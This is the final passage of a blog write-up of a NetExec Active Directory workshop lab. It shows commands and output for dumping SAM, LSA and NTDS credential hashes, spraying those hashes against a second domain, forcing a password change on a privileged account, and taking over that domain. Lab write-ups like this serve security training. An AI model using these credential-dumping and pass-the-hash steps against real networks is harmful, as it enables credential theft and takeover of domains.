</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping local SAM hashes <span style="color:#f92672">(</span>uid:rid:lmhash:nthash<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:6db5eb0d52b4016139ea90b2f36a652d:::
</span></span><span style="display:flex;"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style="display:flex;"><span>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping cached domain logon information <span style="color:#f92672">(</span>domain/username:hash<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping LSA Secrets
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> $MACHINE.ACC 
</span></span><span style="display:flex;"><span>$MACHINE.ACC:plain_password_hex:0ea26d2703cc231b11c6966908a847952e50af684ccf0ee3a990fc723ad40d8b29fbed4b7b6be5f28ac8145b5f61b52e9e7837a84d0c955a4a508e2177b6d6ed943565d4937c50ec695eb9a72b0e985b8c78359a2f406700fbdc04a8ff57a60fb85b0f4ec300ffae4fc186d101850ad16c73147742139edce9e6bd2b16f8f477d2d8c6f28d2b08934c15c440cf03b4f683c5cdc72fee58b7fca8496434e85fde374e8d77e58ed0b1607a03920489084736e5a4abbdea8c00846540d0a2d306b398d65e29a5609f0a0053bbd74e59a3bffb31857f241f21ee290e79ba6cb582735ae0f47f237d93899ed192cfeb5f2e4a
</span></span><span style="display:flex;"><span>$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:6818e41f26d213767204815c05cece26
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> DefaultPassword 
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>Unknown User<span style="color:#f92672">)</span>:db_yLR8;W<span style="color:#f92672">}</span>pl
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> DPAPI_SYSTEM 
</span></span><span style="display:flex;"><span>dpapi_machinekey:0x9526ee65d5e6780ce9ddd7a2826f358f43f8fde0
</span></span><span style="display:flex;"><span>dpapi_userkey:0xe849f9292132952a94dcef6379b33b59be9bbc3c
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> NL$KM 
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">0000</span>   BE <span style="color:#ae81ff">05</span> <span style="color:#ae81ff">50</span> 1C AA F8 5E E2  FC <span style="color:#ae81ff">24</span> <span style="color:#ae81ff">03</span> <span style="color:#ae81ff">63</span> 8E <span style="color:#ae81ff">41</span> 9F <span style="color:#ae81ff">86</span>   ..P...^..$.c.A..
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">0010</span>   <span style="color:#ae81ff">22</span> <span style="color:#ae81ff">50</span> C2 DB 0F FB D1 C8  3B E5 <span style="color:#ae81ff">68</span> E1 <span style="color:#ae81ff">71</span> AA FF 4E   <span style="color:#e6db74">&#34;P......;.h.q..N
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 0020   FE FB 9A 8C B7 AD FF 49  2A BA 71 0B A1 72 68 8D   .......I*.q..rh.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 0030   B6 E9 70 DC C5 09 EA 45  46 79 0E 37 D1 B1 DE D9   ..p....EFy.7....
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">NL</span>$KM<span style="color:#e6db74">:be05501caaf85ee2fc2403638e419f862250c2db0ffbd1c83be568e171aaff4efefb9a8cb7adff492aba710ba172688db6e970dcc509ea4546790e37d1b1ded9
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] Cleaning up...
</span></span></span></code></pre></div><p>We get the administrator&rsquo;s hash as well as a cleartext password (<code>db_yLR8;W}pl</code>) for an unknown user.</p>
<p>We can directly dump NTDS since we are domain administrator of the <code>rebels.local</code> domain:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb 10.0.0.7 -u <span style="color:#e6db74">&#39;administrator&#39;</span> -H <span style="color:#e6db74">&#39;6db5eb0d52b4016139ea90b2f36a652d&#39;</span> --ntds                                                                     
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user &lt;user&gt; to dump a specific user safely or the module -M ntdsutil <span style="color:#f92672">[</span>Y/n<span style="color:#f92672">]</span> Y                                                        
</span></span><span style="display:flex;"><span>SMB         10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:jedha<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:rebels.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>                                                        
</span></span><span style="display:flex;"><span>SMB         10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> rebels.local<span style="color:#ae81ff">\a</span>dministrator:6db5eb0d52b4016139ea90b2f36a652d <span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>                                                                                        
</span></span><span style="display:flex;"><span>SMB         10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Dumping the NTDS, this could take a <span style="color:#66d9ef">while</span> so go grab a redbull...                                                                                          
</span></span><span style="display:flex;"><span>SMB         10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            rebels.local<span style="color:#ae81ff">\a</span>dministrator:500:aad3b435b51404eeaad3b435b51404ee:6db5eb0d52b4016139ea90b2f36a652d:::                                                            
</span></span><span style="display:flex;"><span>SMB         10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                 
</span></span><span style="display:flex;"><span>SMB         10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8197f5b787e8ed87845d94cae97f9758:::                                                                                
</span></span><span style="display:flex;"><span>SMB         10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            rebels.local<span style="color:#ae81ff">\l</span>uke:1106:aad3b435b51404eeaad3b435b51404ee:98fc6b0578a8d209a834b20513fe1ba3:::                                                                    
</span></span><span style="display:flex;"><span>SMB         10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            rebels.local<span style="color:#ae81ff">\l</span>eia:1107:aad3b435b51404eeaad3b435b51404ee:34feb4df76020988f933d340c04c5868:::                                                                    
</span></span><span style="display:flex;"><span>SMB         10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            rebels.local<span style="color:#ae81ff">\h</span>an:1108:aad3b435b51404eeaad3b435b51404ee:fa159092f7dc6ae78ed6496e0cec5c0d:::                                                                     
</span></span><span style="display:flex;"><span>SMB         10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            rebels.local<span style="color:#ae81ff">\o</span>biwan:1109:aad3b435b51404eeaad3b435b51404ee:f0057beb1194995b74c28becda1ad201:::                                                                  
</span></span><span style="display:flex;"><span>SMB         10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            rebels.local<span style="color:#ae81ff">\l</span>ando:1110:aad3b435b51404eeaad3b435b51404ee:c697c8e44fc55db5f0eeb0f1de1c47f7:::                                                                   
</span></span><span style="display:flex;"><span>SMB         10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            rebels.local<span style="color:#ae81ff">\j</span>yn:1111:aad3b435b51404eeaad3b435b51404ee:4febb45b02ee6b653a73eac892c49952:::                                                                     
</span></span><span style="display:flex;"><span>SMB         10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            rebels.local<span style="color:#ae81ff">\c</span>assian:1112:aad3b435b51404eeaad3b435b51404ee:734bd69e2739ff552aeb26535dc1ee4c:::                                                                 
</span></span><span style="display:flex;"><span>SMB         10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            rebels.local<span style="color:#ae81ff">\f</span>inn:1113:aad3b435b51404eeaad3b435b51404ee:6bf5bfe70e178247f3d433ce3d02fae4:::                                                                    
</span></span><span style="display:flex;"><span>SMB         10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            rebels.local<span style="color:#ae81ff">\r</span>ey:1114:aad3b435b51404eeaad3b435b51404ee:dd6a2b0a07e11f04518fb7470ba10bf9:::                                                                     
</span></span><span style="display:flex;"><span>SMB         10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            rebels.local<span style="color:#ae81ff">\m</span>az:1115:aad3b435b51404eeaad3b435b51404ee:844bfaf9557153d4969c03156bd77f25:::                                                                     
</span></span><span style="display:flex;"><span>SMB         10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            rebels.local<span style="color:#ae81ff">\p</span>oe:1116:aad3b435b51404eeaad3b435b51404ee:15267fa2b302e8d98d13fb36d2dbbd64:::                                                                     
</span></span><span style="display:flex;"><span>SMB         10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            rebels.local<span style="color:#ae81ff">\w</span>edge:1117:aad3b435b51404eeaad3b435b51404ee:c653673f3238e496371c8fa0884c9774:::                                                                   
</span></span><span style="display:flex;"><span>SMB         10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            rebels.local<span style="color:#ae81ff">\b</span>iggs:1118:aad3b435b51404eeaad3b435b51404ee:168b115abc1c2f2892936c0ea6728de8:::                                                                   
</span></span><span style="display:flex;"><span>SMB         10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            rebels.local<span style="color:#ae81ff">\m</span>on:1119:aad3b435b51404eeaad3b435b51404ee:2e9de0b78541e3acece4806d5feb0e96:::                                                                     
</span></span><span style="display:flex;"><span>SMB         10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            rebels.local<span style="color:#ae81ff">\b</span>odhi:1120:aad3b435b51404eeaad3b435b51404ee:9bcbf649c669e0f24cbcb1b5ed523985:::                                                                   
</span></span><span style="display:flex;"><span>SMB         10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            rebels.local<span style="color:#ae81ff">\c</span>hirrut:1121:aad3b435b51404eeaad3b435b51404ee:071d139ac3093f5e3e7ce49b52dc8de7:::                                                                 
</span></span><span style="display:flex;"><span>SMB         10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            rebels.local<span style="color:#ae81ff">\b</span>aze:1122:aad3b435b51404eeaad3b435b51404ee:db1c9344ff30724d47becf7ac8b35932:::                                                                    
</span></span><span style="display:flex;"><span>SMB         10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            rebels.local<span style="color:#ae81ff">\h</span>era:1123:aad3b435b51404eeaad3b435b51404ee:6782429a2408c734148d6a4ba2cf100e:::                                                                    
</span></span><span style="display:flex;"><span>SMB         10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            rebels.local<span style="color:#ae81ff">\e</span>zra:1124:aad3b435b51404eeaad3b435b51404ee:487475c54ff573d9d7235a6f7b9c96a2:::                                                                    
</span></span><span style="display:flex;"><span>SMB         10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            rebels.local<span style="color:#ae81ff">\s</span>abine:1125:aad3b435b51404eeaad3b435b51404ee:94f9963f53b977b90caaf40f94203168:::                                                                  
</span></span><span style="display:flex;"><span>SMB         10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            jedha$:1000:aad3b435b51404eeaad3b435b51404ee:6818e41f26d213767204815c05cece26:::                                                                               
</span></span><span style="display:flex;"><span>SMB         10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            DANTOOINE$:1103:aad3b435b51404eeaad3b435b51404ee:2ede1c63b1a60dce4638bc925a4d77d1:::                                                                           
</span></span><span style="display:flex;"><span>SMB         10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            ENDOR$:1104:aad3b435b51404eeaad3b435b51404ee:e43f63b3d680076ffd8dafaae8b642c1:::                                                                               
</span></span><span style="display:flex;"><span>SMB         10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            gMSA-scarif$:1105:aad3b435b51404eeaad3b435b51404ee:889c32ef466ff6b367cf8adf7fce539b:::                                                                         
</span></span><span style="display:flex;"><span>SMB         10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Dumped <span style="color:#ae81ff">27</span> NTDS hashes to /root/.nxc/logs/ntds/jedha_10.0.0.7_2025-06-29_003209.ntds of which <span style="color:#ae81ff">23</span> were added to the database
</span></span></code></pre></div><p>Let&rsquo;s create a list of all the NT hashes above:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /root/.nxc/logs/ntds/jedha_10.0.0.7_2025-06-29_003209.ntds | grep -iv disabled | cut -d <span style="color:#e6db74">&#39;:&#39;</span> -f4 &gt; users/hashes.txt
</span></span></code></pre></div><h3 id="password-spraying-on-empirelocal-">Password Spraying on <code>empire.local</code> 💦</h3>
<p>Then spray them on the other domain:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb scope/dc.txt -u users/all-users.txt -H users/hashes.txt
</span></span><span style="display:flex;"><span>SMB         10.0.0.5        <span style="color:#ae81ff">445</span>    coruscant        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> empire.local<span style="color:#ae81ff">\f</span>n2187:6bf5bfe70e178247f3d433ce3d02fae4
</span></span></code></pre></div><p>We get a hit with <code>fn2187</code>, as we saw earlier this account has a path to domain admin since he can change the password of <code>vader</code>:</p>
<p><img src="_screenshots/Workshop-NetExec-BloodHound-vader-analysis.png" alt=""></p>
<p>Finally we can change <code>vader</code>&rsquo;s password to get domain administrator of <code>empire.local</code> with the <code>change-password</code> module:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb 10.0.0.5 -u fn2187 -H 6bf5bfe70e178247f3d433ce3d02fae4 -M change-password -o USER<span style="color:#f92672">=</span>vader NEWPASS<span style="color:#f92672">=</span>potato123!                                                            
</span></span><span style="display:flex;"><span>SMB         10.0.0.5        <span style="color:#ae81ff">445</span>    coruscant        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:coruscant<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:empire.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.0.0.5        <span style="color:#ae81ff">445</span>    coruscant        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> empire.local<span style="color:#ae81ff">\f</span>n2187:6bf5bfe70e178247f3d433ce3d02fae4 
</span></span><span style="display:flex;"><span>CHANGE-P... 10.0.0.5        <span style="color:#ae81ff">445</span>    coruscant        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Successfully changed password <span style="color:#66d9ef">for</span> vader
</span></span></code></pre></div><p>Then dump NTDS on <code>empire.local</code> to get the Domain Administrator&rsquo;s NT hash:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb 10.0.0.5 -u vader -p potato123! --ntds                                                                                                       
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user &lt;user&gt; to dump a specific user safely or the module -M ntdsutil <span style="color:#f92672">[</span>Y/n<span style="color:#f92672">]</span> Y                                                        
</span></span><span style="display:flex;"><span>SMB         10.0.0.5        <span style="color:#ae81ff">445</span>    coruscant        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:coruscant<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:empire.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>                                                    
</span></span><span style="display:flex;"><span>SMB         10.0.0.5        <span style="color:#ae81ff">445</span>    coruscant        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> empire.local<span style="color:#ae81ff">\v</span>ader:potato123!                                                                                                                              
</span></span><span style="display:flex;"><span>SMB         10.0.0.5        <span style="color:#ae81ff">445</span>    coruscant        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied                                                                             
</span></span><span style="display:flex;"><span>SMB         10.0.0.5        <span style="color:#ae81ff">445</span>    coruscant        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Dumping the NTDS, this could take a <span style="color:#66d9ef">while</span> so go grab a redbull...                                                                                          
</span></span><span style="display:flex;"><span>SMB         10.0.0.5        <span style="color:#ae81ff">445</span>    coruscant        localadmin:500:aad3b435b51404eeaad3b435b51404ee:2ca98fe859493f43996323332531b51e:::
</span></span></code></pre></div><hr>
<h2 id="thanks--final-thoughts">Thanks &amp; Final Thoughts</h2>
<p>Huge thanks to <a href="https://x.com/mpgn_x64">@mpgn_x64</a>, <a href="https://x.com/wil_fri3d">@wil_fri3d</a> and <a href="https://x.com/_zblurx">@_zblurx</a> for organizing this workshop for yet another year. I&rsquo;m pleased that I managed to complete both domains this year 😁!</p>
<p>Congratulations to <a href="https://x.com/LeandreOnizuka">@LeandreOnizuka</a> for the first place 🏆 and <a href="https://x.com/wfrnds1">wfrnds1</a> for the second place!</p>
<p>I ended up completing the lab in just under 5 hours as you can see from the timestamp below:</p>
<p><img src="_screenshots/Workshop-NetExec-NTDS-owned.png" alt=""></p>
<p>Hopefully I do better next year and maybe get a place on the podium 🤞 (and a seat in the workshop room if there is more space and plugs to charge my laptop 🤣. I ended up squatting the DGSE&rsquo;s stand 😎)!</p>
<p>Nonetheless I learnt to use a bunch of different/new modules/flags that I had never tested before such as:</p>
<ul>
<li><code>--nla-screenshot</code></li>
<li><code>--no-preauth-targets</code></li>
<li><code>-M enum_logins</code></li>
<li><code>-M link_xpcmd</code></li>
<li><code>-M backup_operator</code></li>
<li><code>-M change-password</code></li>
</ul>
<p>As shown throughout this writeup NetExec is getting to a stage that it can be used &ldquo;almost&rdquo; exclusively (shoutout <code>secretsdump</code> 😆) to perform Active Directory pentesting. This is thanks to the massive work from all it&rsquo;s awesome contributors.</p>
<p>If you have any ideas on cool modules that could be added or any quality of life changes go for it and make a PR. As an example here is a recent Recycle Bin <a href="https://github.com/Pennyw0rth/NetExec/pull/609">PR</a> that I developed (and still need to integrate with @Dfte&rsquo;s module 😅) to enumerate and download files in the Recycle Bin. It really is a surprisingly easy development process and there are plenty of templates from other modules that you can use to get started.</p>
<p>I will be releasing a blog post soon on how to create your first NetExec module if you&rsquo;re interested.</p>
<p>Hope you learnt something new and I look forward to hanging out next year and owning the domains even faster!</p>

      </div>
    
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
